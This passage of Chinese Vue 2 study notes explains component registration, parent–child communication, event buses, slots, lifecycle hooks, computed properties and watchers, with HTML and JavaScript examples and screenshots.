     console.log(requireComponent.keys());
     requireComponent.keys().forEach(fileName => {
       // 获取组件配置
       const componentConfig = requireComponent(fileName)
       // 获取组件的 PascalCase 命名
       const componentName = fileName.replace(/^\.\//,'').replace(/\.vue/,'')
       console.log(componentName);
       // 全局注册组件
       Vue.component(
         componentName,
         // 如果这个组件选项是通过 `export default` 导出的，
         // 那么就会优先使用 `.default`，
         // 否则回退到使用模块的根。
         componentConfig.default || componentConfig
       )
     })
```

参考资料：https://cn.vuejs.org/v2/guide/components-registration.html

#### 组件局部注册

**组件局部注册基本使用一：**

```
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <script src="../js/vue.js"></script>
       <title>Document</title>
     </head>
     <body>
       <div id="app">
         <cpn></cpn>
       </div>
       <div id="app2">
         <cpn></cpn>
       </div>
       <script>
         //1.构建组件构造器对象
         const cpn = Vue.extend({
           template: `<div>  <h2>我是标题</h2> <p> 我是内容， 哈哈哈哈 </p></div > `
         const app = new Vue({
           el: "#app",
           data: {
             message: "你好啊"
           },
           // 局部注册,只能在注册的实例上使用
           components: {
             cpn: cpn
           }
         })
         const app2 = new Vue({
           el: "#app2",
           data: {
             message: "你好啊"
           }
         })
       </script>
     </body>
     </html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220534.png" alt="image-20210224174635756" style="zoom:67%;" />

**组件局部注册基本使用二：**

```
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <script src="../js/vue.js"></script>
       <title>Document</title>
     </head>
     <body>
       <div id="app">
         <cpn></cpn>
         <button-counter></button-counter>
       </div>
       <script>
         // 全局注册一个名为 button-counter 的新组件
         Vue.component('button-counter', {
           data: function () {
             return {
               count: 0
             }
           },
           template: '<button v-on:click="count++">You clicked me {{ count }} times.</button>'
         })
         const app = new Vue({
           el: "#app",
           data: {
             message: "你好啊"
           },
           // 局部注册
           components: {
             cpn: {
               template: `<div>  <h2>我是标题</h2> <p> 我是内容， 哈哈哈哈 </p></div > `
             }
           }
         })
       </script>
     </body>
     </html>
```

效果：

![image-20210224203444970](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220537.png)

**组件模板的分离写法（推荐使用）：**

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220542.png" alt="image-20210225015015539" style="zoom: 50%;" />

```
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <script src="../js/vue.js"></script>
       <title>Document</title>
     </head>
     <body>
       <div id="app">
         <cpn></cpn>
         <cpn2></cpn2>
       </div>
       <!--1、script标签，注意：类型必须是text/template-->
       <!-- <script type="text/template" id='cpn'>
         <div>
           <h2>组件模板分离</h2>
         </div>
       </script> -->
       <!--2、template标签->
       <template id='cpn'>
         <div>
           <h2>组件模板分离</h2>
         </div>
       </template>
       <script>
         //注册一个全局组件
         Vue.component('cpn', {
           template: '#cpn'
         })
         const app = new Vue({
           el: "#app",
           data: {
             message: "你好啊"
           },
           // 局部注册
           components: {
             cpn2: {
               template: '#cpn'
             }
           }
         })
       </script>
     </body>
     </html>	
```

效果：

![image-20210225014934504](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220545.png)

**父子组件：**

实例：

```
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <script src="../js/vue.js"></script>
       <title>Document</title>
     </head>
     <body>
       <div id="app">
         <!-- <cpn></cpn> -->
         <cpn2></cpn2>
       </div>
       <script>
         //1.构建组件构造器对象
         const cpn = Vue.extend({
           template: `<div>  <h2>我是标题</h2> <p> 我是内容， 哈哈哈哈 </p></div > `
         })
         const cpn2 = Vue.extend({
           template: ` <div> cpn2开始 <cpn></cpn>  <h2>我是标题2</h2> <p> 我是内容，呵呵呵呵 <br>cpn2结束   </p></div > `,
           //继续使用组件
           components: {
             cpn: cpn
           }
         })
         const app = new Vue({
           el: "#app",
           data: {
             message: "你好啊"
           },
           // 局部注册
           components: {
             cpn2: cpn2
           }
         })
       </script>
     </body>
     </html>
```

效果：

![image-20210224175523977](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220549.png)

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220553.png" alt="image-20210225152440433" style="zoom:67%;" />

### Vue实例和组件

> Vue实例是Vue应用的启动器，Vue组件是Vue实例的扩展。

#### 1. Vue实例

通过构造函数可以创建一个Vue的**根实例**。

SPA应用中，只会创建一个Vue根实例，应用都是通过这个根实例启动的。

实例化 Vue 时，需要传入一个选项对象，它可以包含数据（data），模板（template），挂载元素（el），方法（methods）与生命周期钩子函数（created，mounted...）等选项。下面是一个真实项目中定义的Vue实例：

```jsx
import Vue from 'vue';
import App from './App.vue'
...
// 激活Vue调试工具vue-devtools
Vue.config.devtools = true;

new Vue({
    router, // react-router
    store,  // vuex
    el: '#app', // 需要渲染的DOM节点
    render: h => h(App) // //h是createElement 的别名，创建/加载组件
});
```

#### 2. Vue组件

Vue组件是被扩展的Vue实例，同Vue实例类似，它也需要传入一个选项对象，包含数据，模板，生命周期钩子函数等等。

组件分为局部组件和全局组件。

###### (1)局部组件

局部组件只能在所定义的Vue实例中使用，格式如下：

```csharp
//定义<my-component>组件
new Vue({
  // ...
  components: {
    // <my-component> 将只在父模板可用
    'my-component': {
      template: '<div>A custom component!</div>'
    }
  }
})
```

###### (2)全局组件

###### 第一种方式：利用Vue提供的静态函数`component`注册：

```jsx
Vue.component('my-component', {
  template: '<div>A custom component!</div>',
  //必须是用函数返回数据模型，这样才能让多个组件实例拥有自己的数据模型
  data: function () {
    return data;
  }
})
```

###### 第二种方式：单文件组件

定义一个后缀为`.vue`的文件，利用webpack编译处理。

单文件组件的最大优点是，可以将组件相关的HTML，CSS，JS都定义在`.vue`文件内，默认支持CSS模块化（样式仅在该组件内有效），JavaScript模块化（CommonJs模块）。

参考官网例子：

<img src="https:////upload-images.jianshu.io/upload_images/25750-d6d488ce3e040f4a.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp" alt="img" style="zoom:67%;" />

注意，`<style>`有`scope`属性后，能够将标签内部的CSS选择器自动加上后缀，使其仅应用在此组件内。下图是编译后的组件内联样式：

![img](https:////upload-images.jianshu.io/upload_images/25750-2fc1686df9c8b5c6.png?imageMogr2/auto-orient/strip|imageView2/2/w/595/format/webp)

vue文件组件也支持CSS预处理语言，比如scss或者less。如需使用scss，定义`lang`属性即可：

```xml
<style lang="scss" scoped>...</style>
```

webpack.config中需要加载vue-loader来解析`.vue`文件（下面配置支持在vue组件中使用scss语法）。

```tsx
module: {
        rules: [
            {
                test: /\.vue$/,
                loader: 'vue-loader',
                options: {
                    loaders: {
                        // Since sass-loader (weirdly) has SCSS as its default parse mode, we map
                        // the "scss" and "sass" values for the lang attribute to the right configs here.
                        // other preprocessors should work out of the box, no loader config like this necessary.
                        'scss': 'vue-style-loader!css-loader!sass-loader',
                        'sass': 'vue-style-loader!css-loader!sass-loader?indentedSyntax'
                    }
                    // other vue-loader options go here
                }
            },
            ......
        ]
    },
```

#### 小结

建议采用单文件组件方式创建Vue项目，这样可以更好的和路由插件配合。
 随着项目不断迭代，组件复杂度会随之增加，单文件组件有着更好的可读性和可扩展性，非常适合大中型项目。

### 父子组件通信

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210421223218.png" alt="image-20201027214048493" style="zoom:80%;" />

#### 通过props向子组件传递数据（传）

父组件：

```
<template>
  <div id="app">
    <child :sonmsg="parentmsg"></child>
  </div>
</template>
<script>
import child from './views/child'
export default {
  name: 'App',
  components: {
    child,
  },
  data() {
    return {
      parentmsg: 'parentmsg',
    }
  },
}
</script>
<style></style>
```

子组件（用法一）：

```
<template>
  <div>
    <h3>我是子组件</h3>
    <h3>获取父组件的数据:{{ sonmsg }}</h3>
  </div>
</template>
<script>
export default {
  name: 'child',
   // 不检测类型,全盘接受
   props: ["sonmsg"],
}
</script>
<style scpoed></style>
```

子组件（用法二）：

```
<template>
  <div>
    <h3>我是子组件</h3>
    <h3>获取父组件的数据:{{ sonmsg }}</h3>
  </div>
</template>
<script>
export default {
  name: 'child',
  data() {
    return {}
  },
  props: {
    //定义方式一
    sonmsg: String,
    //定义方式二
    // sonmsg: {
    //   type: Number,
    //   default: 10,//如果父组件没有传值那么默认就为10，
    // 如果是数组或对象，默认值必须是一个函数来返回
    //   propE: {
    // 	type: Array,
    // 	default: () => []
    // }
    // },
    // 定义方式三:
    // sonmsg: {
    //   type: Number,
    //   required: true, //必须传，不然报错
    // },
    //定义方式四
    // 自定义一个验证函数
    // sonmsg: {
    //   validator: (value) => {
    //     return value > 1000 //当函数返回 false 时，输出警告。该函数命名是规定叫validator
    //   },
    // },
  },
}
</script>
<style scpoed></style>

```

结果：

![image-20201027220029318](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220557.png)

`注意：经过测试发现，经过props传值后参数，在Props定义的该参数和父组件是一样的，由于对象是引用类型，所以当父组件把一个对象传给一个子组件的时候，实际上引用的是用一个对象，这时候子组件该值改变也会同时改变父组件该对象的值`

实际上不符合上面规则也能正常显示，但是会报错

上面我们在vue的父子组件传值的时候，我们先需要的子组件上用props注册一些属性：

```
     <template>
         <div>
             props:{{name}},{{age}} 或者 {{$props['name']}},{{$props['age']}}
         </div>
     </template>

     export default{
         props: ['name','age']
     }
```

然后父组件调用的时候当属性来传值

```
	<child name="rick" :age="18"></child>
```

如果我们给child传props没有注册的属性，我们就要用$attrs来取了

parent：

```
	<child name="rick" :age="18" gender="male"></child>
```

child:

```
     <template>
         <div>
             props:{{name}},{{age}} 或者 {{$props['name']}},{{$props['age']}} 
             <br>
             attrs: {{$attrs['gender']}}  在$attrs里面只会有props没有注册的属性
         </div>
     </template>

     export default{
         props: ['name','age']
     }
```

当然这个$attrs是vue2.4才推出的，为了简化父组件和孙组件的传值：

```
	父组件 template（假设gender属性没有被props注册）:
```

```
	<child1 gender="male"></child1>
```

<child2 v-bind="$attrs"></child2>，这是v-bind唯一可以直接跟等号的特殊写法):

```
	<child2 v-bind=”$attrs”></child2>
```

在child2里面，就可以直接用props注册gender,来直接获取来自“祖父组件”的gender值了（当然，不注册也是可以用$attrs来取值的）

#### 通过事件向父组件发送消息（传）

父组件：

```
<template>
  <div id="app">
    <child @itemClick="parentfun"></child>
  </div>
</template>
<script>
import child from './views/child'
export default {
  name: 'App',
  components: {
    child,
  },
  methods: {
    //不接收参数
    parentfun() {
      console.log('子传父')
    },
    //接收参数
    parentfun(item) {
      console.log(item)
      console.log('子传父')
    },
  },
}
</script>
<style></style>
```

子组件：

```
<template>
  <div>
    <button @click="btnClick(name)">子组件按钮，发射事件</button>
  </div>
</template>
<script>
export default {
  name: 'child',
  data() {
    return {
      name: '我是子组件中的name',
    }
  },
  methods: {
    //不传参数
    btnClick() {
      //发射
      this.$emit('itemClick')
    },
    //传参数
    btnClick(item) {
      //发射
      this.$emit('itemClick', item)
    },
  },
}
</script>
<style scpoed></style>
```

#### 父组件访问子组件（访）

> 父组件访问子组件：使用$children或$refs reference(引用)
>
> this.$children或者$refs是一个数组类型，它包含子组件所有对象

**$children**

直接输出this.$children:

```
  created() {
    console.log(this.$children)
  },
```

输出

![image-20201028001432768](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220601.png)

$this.children是所有子组件的一个数组，通过它可以访问它所有子组件的所有数据和方法等等，但是$this.children是通过数组下标来访问子组件数据，比如

```
	console.log(this.$children[0].name)  //name是子组件的数据
	console.log(this.$children[0].btnClick)  //btnClick是子组件的方法
```

可以直接访问子组件的数据和方法，不需要this.$children.data.name或者this.$children.methods.btnClick

但是this.$children有一个缺点，就是需要通过下标来访问子组件，假如有多个子组件，就得输出区查看对应子组件得下标值才能确定用哪个下标

**$refs**

直接输出this.$refs:

```
  created() {
    console.log(this.$children)
  },
```

输出

![image-20201028002305031](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220604.png)

输出为一个空对象

$refs默认为一个空数组，但是在对应得子组件加上ref="自定义名字",就能访问该子组件了，并且可以通过该自定义名称来访问

当我在子组件child加上ref时

![image-20201028002501028](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210421223202.png)

这时候再输出$refs

![image-20201028002530448](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220608.png)

这时候就可以通过自定义名称访问子组件了，

```
	console.log(this.$refs.one.name)  //name是子组件的数据
	console.log(this.$refs.one.btnClick)  //btnClick是子组件的方法
```

`最重要一点是,通过ref可以直接获取普通原宿的dom，这样就不需要document.get什么了，`

例：

```
<template>
  <div class="com-container" ref="test">
    <div class="com-chart" ref="seller_ref">你好</div>
  </div>
</template>
<script>
export default {
  name: 'Seller',
  data() {
    return {}
  },
  components: {},
  methods: {
  },
  mounted() {
    console.log(this.$refs.test)      
    console.log(this.$refs.seller_ref.innerHTML)
  },
}
</script>
```

输出：

![image-20210106101430868](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220612.png)

#### 子组件访问父组件（访）

> 子组件访问父组件：使用$parent

子访问父由于只可能有一个父组件（定义在模板里面的不是子组件，只有调用了才算子组件，就算同一个模板在不同组件里面它们也是独立的，只可能有一个父组件），所以$parent非常简单

直接输出：

```
  created() {
    console.log(this.$parent)
  },
```

输出：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220615.png" alt="image-20201028003140417" style="zoom:67%;" />

如果需要访问父组件的数据或者方法可以这样访问：

	console.log(this.$parent.name)  //name是父组件的数据
	console.log(this.$parent.btnClick)  //btnClick是父组件的方法
虽然$children、$refs和$parent非常简单易用，但是会让组件之间不够独立，尽量减少使用

### 组件通信（非父子关系）

> 有时候两个组件也需要通信（非父子关系）。当然Vue2.0提供了Vuex，但在简单的场景下，可以使用一个空的Vue实例作为中央事件总线。

在main.js创建一个空的Vue实例，并且赋值给Vue.prototype.bus

```
	Vue.prototype.bus = new Vue()
```

现在，这个特定的总线使用两个方法 `$on` 和 `$emit` 。一个用于创建发出的事件，它就是`$emit` ；另一个用于订阅 `$on` ,可以在任意组件使用，但是尽量在平行组件使用，而且减少使用

在一个组件发送事件和数据：

```
	this.bus.$emit("eventName",data)
```

在另一个组件中接收事件和数据（一般放在created方法中)：

```
	this.bus.$on("eventName",(data) => { console.log(data)})
```

this的作用域要指向当前的vm实例，on监听事件一般放在组件生命周期函数中的created或者mounted中，注销bus需要在beforeDestroy中；

页面路由的时候，原有页面中的bus事件并没有被注销，依然隐藏在程序中，注册的总线事件要在组件销毁时卸载，否则会多次挂载，造成触发一次但多个响应的情况可以在离开界面时注销bus。

```
          beforeDestroy () {
                this.$bus.$off('eventName',this.todo);
          }
```

需要注意的是：`由于公车总线是利用新创建的Vue对象来进行传递事件的`，`所以emit和on中绑定的回调函数中的this并不指向原来的Vue对象，`

`所以我们需要提前定义一个变量来接收原来的this,比如在emit和on函数前写：let _this = this，这样我们就能拿到原来对象的数据了`

### slot插槽,

#### 匿名插槽

匿名插槽的基本使用，

使用例子：

子组件：

```
<template>
    <div class="child">
        <h3>这里是子组件</h3>
        <slot><span>默认值</span></slot>
    </div>
</template>

```

父组件：

```
<template>
    <div class="father">
        <h3>这里是父组件</h3>
        <child>
            <div class="tmpl">
              <span>菜单1</span>
              <span>菜单2</span>
              <span>菜单3</span>
              <span>菜单4</span>
              <span>菜单5</span>
              <span>菜单6</span>
            </div>
        </child>
    </div>
</template>
<script>
  import Child from './Child.vue'
    export default {
        components:{
          'child': Child
        }
    }
</script>
```

在使用子组件时，只有当子组件里面定义了插槽才能往子组件里面填东西，而且都会插在匿名插槽里面

`<slot><span>默认值</span></slot>，solt里面可以给定默认值，如果没有给他插入值，那么就显示默认值，如果有插入其他元素，那么默认值就会被覆盖`

上面使用后输出结果：

![image-20201028230741038](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220619.png)

#### 具名插槽

具名插槽的基本使用，

子组件：

```
<template>
  <div class="child">
    <slot name="up"></slot>
    <h3>这里是子组件</h3>
    <slot name="down"></slot>
    <slot></slot>
  </div>
</template>
```

父组件：

```
<template>
  <div class="father">
    <h3>这里是父组件</h3>
    <child>
      <div class="tmpl" slot="up">
        <span>我是name为up的具名插槽</span>
      </div>
      <div class="tmpl" slot="down">
        <span>我是name为down的具名插槽</span>
      </div>
      <div class="tmpl">
        <span>我是匿名插槽</span>
      </div>
    </child>
  </div>
</template>
<script>
  import Child from './Child.vue'
  export default {
    components:{
      'child': Child
    }
  }
</script>
```

`具名插槽可以和匿名插槽混用`，具名插槽有名字，子组件通过 <slot name="up"></slot>定义，父组件在使用的时候通过slot="up"使用，并且会放到对应的位置

上面例子的输出结果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220622.png" alt="image-20201028232146002" style="zoom:80%;" />

#### 作用域插槽(vue3.0已废弃)

在接下来所有的 2.x 版本中 `slot` 和 `slot-scope` attribute 仍会被支持，但已经被官方废弃且不会出现在 Vue 3 中。

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220625.png" alt="image-20201028233714051" style="zoom:80%;" />

由上面我们可以得知，作用域插槽的主要作用时能够让父组件自定义使用子组件里面的数据，比如下面例子

子组件：

```
<template>
  <div class="child">
    <h3>这里是子组件</h3>
    <slot :data="per" name="up"></slot>
    <slot :data="per" ></slot>
  </div>
</template>

<script>
export default {
  data: function() {
    return {
      per: ["zhangsan", "lisi", "wanwu", "zhaoliu", "tianqi", "xiaoba"]
    };
  },
  computed: {},
  methods: {},
  components: {}
};
</script>
```

子组件里面有数据data，通过:data=“per",我们可以把子组件中的一些数据传给父组件处理，而不是在子组件写死

父组件：

```
<template>
  <div class="father">
    <h3>这里是父组件</h3>
    <!--第一次使用：用flex展示数据-->
    <child>
      <div1 slot-scope="user1" slot="up">
        <div class="tmpl">
          <span v-for="item in user1.data" :key="item">{{ item }}</span>
        </div>
      </div1>
    </child>
    <!--第二次使用：用列表展示数据-->
    <child>
      <template slot-scope="user2" slot="up">
        <ul>
          <li v-for="item in user2.data" :key="item">{{ item }}</li>
        </ul>
      </template>
    </child>
    <!--第三次使用：直接显示数据-->
    <child>
      <template slot-scope="user3">
        {{ user3.data }}
      </template>
    </child>
    <!--第四次使用：不使用其提供的数据-->
    <child>
      我就是模板
    </child>
  </div>
</template>
<script>
import Child from "./Child.vue";
export default {
  components: {
    child: Child
  }
};
</script>
```

在要插入的内容中加上solt-scope='自定义名字'就可以获取子组件中绑定给:data的数据了，并且赋值给自定义名字,

从上面可以看出，这时候就可以利用solt-scope获取子组件数据，从而实现自定义使用了

上面有些不是使用div而是使用template,这是因为旧版本要求必须是template,所以为了兼容性，有些时候会写template

注意：是通过自定义名字.data输出子组件数据

上面例子输出结果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220629.png" alt="image-20201029000428683" style="zoom:80%;" />

## 生命周期

> Vue实例有一个完整的生命周期，也就是说从开始创建、初始化数据、编译模板、挂在DOM、渲染-更新-渲染、卸载等一系列过程，我们成为Vue 实例的生命周期，钩子就是在某个阶段给你一个做某些处理的机会。

<img src="https://upload-images.jianshu.io/upload_images/11370083-f279314aef6741db.jpg?imageMogr2/auto-orient/strip|imageView2/2/w/1080/format/webp" alt="img" style="zoom: 67%;" />

**beforeCreate( 创建前 )**

在实例初始化之后，数据观测和事件配置之前被调用，此时组件的选项对象还未创建，el 和 data ,methods并未初始化，因此无法访问methods， data， computed等上的方法和数据。

**created ( 创建后 ）**

实例已经创建完成之后被调用，在这一步，实例已完成以下配置：数据观测、属性和方法的运算，watch/event事件回调，完成了data 数据的初始化，el没有。 然而，挂在阶段还没有开始, $el属性目前不可见，这是一个常用的生命周期，因为你可以调用methods中的方法，改变data中的数据，并且修改可以通过vue的响应式绑定体现在页面上，，获取computed中的计算属性等等，通常我们可以在这里对实例进行预处理，也有一些童鞋喜欢在这里发ajax请求，值得注意的是，这个周期中是没有什么方法来对实例化过程进行拦截的，因此假如有某些数据必须获取才允许进入页面的话，并不适合在这个方法发请求，建议在组件路由钩子beforeRouteEnter中完成

**beforeMount**

挂在开始之前被调用，相关的render函数首次被调用（虚拟DOM），实例已完成以下的配置： 编译模板，把data里面的数据和模板生成html，完成了el和data 初始化，注意此时还没有挂在html到页面上。

**mounted**

挂在完成，也就是模板中的HTML渲染到HTML页面中，此时一般可以做一些ajax操作，mounted只会执行一次。

**beforeUpdate**

在数据更新之后被调用，发生在虚拟DOM重新渲染和打补丁之前，可以在该钩子中进一步地更改状态，不会触发附加地重渲染过程

**updated（更新后）**

虚拟dom重新被渲染挂载成功

**beforeDestroy（销毁前）**

在实例销毁之前调用，实例仍然完全可用，

1. 这一步还可以用this来获取实例，
2. 一般在这一步做一些重置的操作，比如清除掉组件中的定时器  和 监听的dom事件

**destroyed（销毁后）**

在实例销毁之后调用，调用后，所以的事件监听器会被移出，所有的子实例也会被销毁，该钩子在服务器端渲染期间不被调用

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <div id="app">
    <p id="h3">
      {{msg}}
    </p>
    <button @click='change'>按钮</button>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
  <script>
    var vm = new Vue({
      el: '#app',
      data: {
        msg: '我是msg'
      },
      methods: {
        show() {
          console.log('执行了show方法');
        },
        change() {
          this.msg = '修改后的msg'
        }
      },
      //这是第1个生命周期函数，表示实例完全被创建出来之前，data和methods中的数据都还没有初始化
      beforeCreate() {
        console.log('------beforeCreate------');
        console.log(this.msg);
        this.show()
      },
      //这是第2个生命周期函数，data和methods中的数据已经初始化可以访问了
      created() {
        console.log('------created------');
        console.log(this.msg);
        this.show()
      },
      //这是第3个生命周期函数，表示模板已经在内存中编辑成功了，但是尚未把模板渲染到页面中
      beforeMount() {
        console.log('------beforeMount------');
        console.log(document.getElementById('app').innerHTML);
        //在beforeMount执行的时候，页面中的元素，还没有被真正替换过来
      },
      //这是第4个生命周期函数，虚拟dom挂载完毕
      mounted() {
        console.log('------mounted------');
        console.log(document.getElementById('app').innerHTML);
      },
      //这是第5个生命周期函数，在数据更新之后被调用
      beforeUpdate() {
        console.log('------beforeUpdate------');
      },
      //这是第6个生命周期函数，虚拟dom重新被渲染挂载成功
      updated() {
        console.log('------updated------');
      }
    })
  </script>
</body>

</html>
```

结果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220632.png" alt="image-20210220003456166" style="zoom:67%;" />

## computed

> Vue中的 computed 属性称为 计算属性 。在模板内可以使用[表达式](http://www.php.cn/wiki/81.html)，而且模板内的表达式是非常的便利，但这种遍历是有一定的限制的，它们实际上是用于一些简单的运算。也就是说，如果在模板中放入太多的逻辑会让模板过重而且难以维护。

实例：

```
     <p id="app">
       <h1>{{ message.split('').reverse().join('') }}</h1>
     </p>
```

在这个示例中，模板不再简单和清晰。你必须看一段时间才能意识到，这里是想要显示变量 message 的翻转[字符串](http://www.php.cn/wiki/57.html)。当你想要在模板中多次引用此处的翻转字符串时，就会更加难以处理。

这就是对于任何复杂逻辑，你都应当使用 计算属性 的原因。接下来咱们一起来学习Vue中的计算属性。

`计算属性可用于快速计算视图（ View ）中显示的属性。这些计算将被缓存，并且只在需要时更新`。

在Vue中有多种方法为视图设置值：

- 使用指令直接将数据值绑定到视图
- 使用简单的表达式对内容进行简单的转换
- 使用过滤器对内容进行简单的转换

除此之外，我们还可以使用计算属性根据数据模型中的值或一组值来计算显示值。

**计算属性**

> 计算属性允许我们对指定的视图，复杂的值计算。这些值将绑定到依赖项值，只在需要时更新。

例如，我们可以在数据模型中有一个 results 数组：

```
data () {
  return {
    results: [
      {
        name: 'English',
        marks: 70
      },
      {
        name: 'Math',
        marks: 80
      },
      {
        name: 'History',
        marks: 90
      }
    ]
  }
}
```

假设我们想要查看所有主题的总数。我们不能使用 filters 或 expressions 来完成这个任务。

- filters ：用于简单的数据格式，在应用程序的多个位置都需要它
- expressions ：不允许使用流操作或其他复杂的逻辑。他们应该保持简单

这个时候，计算属性就可以派上用场。我们可以向模型中添加一个计算值，如下：

```
computed: {
  totalMarks: function () {
    let total = 0
    let me = this
    for (let i = 0; i < me.results.length; i++) {
      total += parseInt(me.results[i].marks)
    }
    return total
  }
}
```

otalMarks 计算属笥使用数组 resultes 的 marks 计算出总值。它只是循环遍历值并返回子总数。

然后，我们可以在视图中显示计算值：

```
<p id="app">
  <p v-for="subject in results">
    <input v-model="subject.marks">
    <span>Marks for {{ subject.name }}: {{ subject.marks }}</span>
  </p>
  <p>
    Total marks are: {{ totalMarks }}
  </p>
</p>
```

**计算属性 vs 方法**

我们可以使用Vue中的 method 计算出学科的总分，最终得到的总数结果是相同的。

在上例的基础上，我们把 computed 区块中的 totalMarks 函数整体移到 methods 中。`同时在模板中将 {{ totalMarks }} 替换成 {{ totalMarks() }}` 。 你最终看到的结果是一样的，如下所示：

```
let app = new Vue({
 el: '#app',
 data () {
  return {
   results: [
    {
     name: '英语',
     marks: 70
    },
    {
     name: '数学',
     marks: 80
    },
    {
     name: '历史',
     marks: 90
    }
   ]
  }
 },
 methods: {
  totalMarks: function () {
   let total = 0
   let me = this
   for (let i = 0; i < me.results.length; i++) {
    total += parseInt(me.results[i].marks)
   }
   return total
  }
 }
})
```

虽然这两种方式输出的结果是相同的，但是性能将遭受毁灭性的打击。使用这种方法， `totalMarks() 方法在每次页面渲染时都被执行一次`（例如，使用每一个 

change ）。

如果我们有一个计算属性，那么Vue会记住计算的属性所依赖的值（在我们这个示例中，那就是 results ）。通过这样做，`Vue只有在依赖变化时才可以计算值。否		则，将返回以前缓存的值。这也意味着 只要 results 还没有发生改变，多次访问 totalMarks 计算属性会立即返回之前的计算结果，而不必再次执行函数`。

上面两个示例也说明，`在Vue中 计算属性是基于它们的依赖进行缓存的，而方法是不会基于它们的依赖进行缓存的。从而使用计算属性要比方法性能更好。`

这也同样意味着下面的计算属性将不再更新，VUE的computed和methods都是响应式的，但前提是在模板中使用它（也就是注册依赖，比如this.什么就是依赖），而且响应式是依据所收集的依赖发生变化而相应的，由于Date.now()在vue眼里是不变的，所以不会响应式改变：

```
     computed: {
      now: function() {
       return  Date.now()
      }
     }
```

相比之下，每当触发重新渲染时，方法的调用方式将总是再次执行函数。因此，函数必须是一个纯函数。它不能有副作用。输出只能依赖于传递给函数的值。

那么我们为什么需要缓存？假设我们有一个性能开销比较大的的计算属性 A ，它需要遍历一个极大的数组和做大量的计算。然后我们可能有其他的计算属性依赖于 A 。如果没有缓存，我们将不可避免的多次执行 A 的 getter ！如果你不希望有缓存，请用方法来替代。

**计算属性的 setter**

计算属性默认只有 getter ，不过在需要时你也可以提供一个 setter ：

```
     computed: {
       fullName: {
         // getter
         get: function () {
           return this.firstName + ' ' + this.lastName
         },
         // setter
         set: function (newValue) {
           var names = newValue.split(' ')
           this.firstName = names[0]
           this.lastName = names[names.length - 1]
         }
       }
     }
```

你在输入框中输入一个 fullName ，然后点击 set 按钮，可以看到对应的效果。你现在再运行 app.fullName="Airen liao" 时，计算属性的 setter 会被调用， app.firstName 和 app.lastName 也相应地会被更新。

## watch

> 可以监听特定数据变化

虽然计算属性在大多数情况下更合适，但有时候也需要一个自定义的 watcher 。这是为什么Vue通过 watch 选项提供一个更通用的方法，来响应数据的变化。当你想要在数据变化响应时，执行异步操作或开销较大的操作，这是很有用的。

Vue确实提供了一种更通用的方式来观察和响应Vue实例上的数据变动： watch 属性 。当你有一些数据需要随着其它数据变动而变动时，你很容易滥用 watch 。然而，通常更好的想法是使用计算属性而不是命令式的 watch 回调。比如下面的示例：

基本用法：

当fullName值变化时，watch监听到并且执行

```
<div>
      <p>FullName: {{fullName}}</p>
      <p>FirstName: <input type="text" v-model="firstName"></p>
</div>
new Vue({
  el: '#root',
  data: {
    firstName: 'Dawei',
    lastName: 'Lou',
    fullName: ''
  },
  watch: {
    firstName(newName, oldName) {
      this.fullName = newName + ' ' + this.lastName;
    }
  } 
})
```

watch中的函数名必须和要监听的数据变量名一致，参数中的newName和oldName分别为数据未改变前的值和改变后的值，当然，这两个参数名可以自定义，只需要注意第一个参数为旧值，第二个参数为新值就行

- handler方法和immediate属性
   上面的例子是值变化时候，watch才执行，我们想让值最初时候watch就执行就用到了`handler`和`immediate`属性

```
watch: {
  firstName: {
    handler(newName, oldName) {
      this.fullName = newName + ' ' + this.lastName;
    },
    // 代表在wacth里声明了firstName这个方法之后立即先去执行handler方法，如果设置了false，那么效果和上边例子一样
    immediate: true
  }
}
```

- deep属性（深度监听，常用语对象下面属性的改变）

```
<div>
      <p>obj.a: {{obj.a}}</p>
      <p>obj.a: <input type="text" v-model="obj.a"></p>
</div>
new Vue({
  el: '#root',
  data: {
    obj: {
      a: 123
    }
  },
  watch: {
    obj: {
      handler(newName, oldName) {
         console.log('obj.a changed');
      },
      deep: true
    }
  } 
})
```

我们在在输入框中输入数据视图改变obj.a的值时，我们发现是无效的。受现代 JavaScript 的限制 (以及废弃 Object.observe)，Vue 不能检测到对象属性的添加或删除。由于 Vue 会在初始化实例时对属性执行 getter/setter 转化过程，所以属性必须在 data 对象上存在才能让 Vue 转换它，这样才能让它是响应的。

 默认情况下 handler 只监听obj这个属性它的引用的变化，我们只有给obj赋值的时候它才会监听到，比如我们在 mounted事件钩子函数中对obj进行重新赋值：

```
mounted: {
  this.obj = {
    a: '456'
  }
}
```

 那么我们需要监听obj里的属性a的值呢？这时候deep属性就派上用场了:

```
watch: {
  obj: {
    handler(newName, oldName) {
